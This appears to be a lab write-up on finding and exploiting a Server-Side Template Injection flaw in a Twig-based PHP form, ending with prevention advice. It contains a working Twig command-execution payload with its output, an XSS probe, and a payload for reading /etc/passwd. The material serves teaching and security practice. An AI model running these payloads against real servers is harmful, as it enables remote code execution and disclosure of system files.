
# 🌐 SSTI 0x01: Server-Side Template Injection Exploration

---

## ❓ Overview of the Lab

This lab focuses on identifying and exploiting Server-Side Template Injection (SSTI) vulnerabilities using a simple message submission interface.

---

## 🛠️ Steps to Identify and Exploit SSTI

1. **Initial XSS Test:**
    - **Objective:** Test for cross-site scripting (XSS) vulnerabilities.
    - **Method:** Submit `<script>alert(1)</script>` in the input field.
    - **Result:** The script executes, indicating susceptibility to script injection.

2. **Interception and Fuzzing with Burp Suite:**
    - **Setup:** Enable proxy/intercept in Burp Suite and capture the POST request upon page reload.
    - **Captured Data:**
        ```
        POST /ssti0x01.php HTTP/1.1
        ...
        greeting=hello
        ```
    - **Fuzzing:** Modify the `greeting` parameter, sending it to Burp Intruder and using payloads from `/usr/share/seclists/fuzzing/template-engines-expression.txt`.

3. **Identifying Template Engine:**
    - **Suspected Payload:** `{{{42*42}}}`
    - **Error Response:** Reveals a syntax error specific to the Twig template engine, confirming its use:
        ```
        <b>Fatal error</b>: Uncaught Twig\Error\SyntaxError: ...
        ```
    - **Confirmation:** Successful exploitation with `${7*7}`, which returns `49` on the front-end, verifying server-side rendering.

4. **Executing the SSTI Attack:**
    - **Payload:** `{{['id',""]|sort('system')}}`
    - **Outcome:** The server executes the `id` command, returning:
        ```
        Your message:
        uid=33(www-data) gid=33(www-data) groups=33(www-data) Array
        ```
    - **Conclusion:** The payload execution confirms a successful SSTI attack.

---

## 📚 Resources Used

- **Burp Suite:** For intercepting, modifying, and replaying HTTP requests.
- **SecLists:** For obtaining a list of fuzzing payloads to test against the server.
- **Hacktricks:** Utilized to reference specific template injection payloads for Twig.

---

## 📖 Learning Outcomes

- **Template Engine Identification:** Understanding error messages to identify the template engine in use.
- **Payload Crafting:** Developing effective payloads to test and exploit template engines.
- **Security Implications:** Recognizing the need for proper input sanitization to prevent SSTI.

---

## 🎯 Real-World Implications

- **Potential Risks:** SSTI can lead to arbitrary code execution, allowing attackers extensive control over the affected server.
- **Prevention Strategies:** Ensure rigorous input validation and sanitization. Use sandboxed environments for template rendering when possible.

---

## 🔗 References

- [Hacktricks: SSTI Twig PHP](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php)
- **Client-Side vs Server-Side Confirmation:** If the HTML page displays `{{7*7}}`, it's client-side. If it evaluates to `49`, it's server-side.
- **Other Payloads:** Example for accessing sensitive files: `{{['cat/etc/passwd']|filter('system')}}`.

---
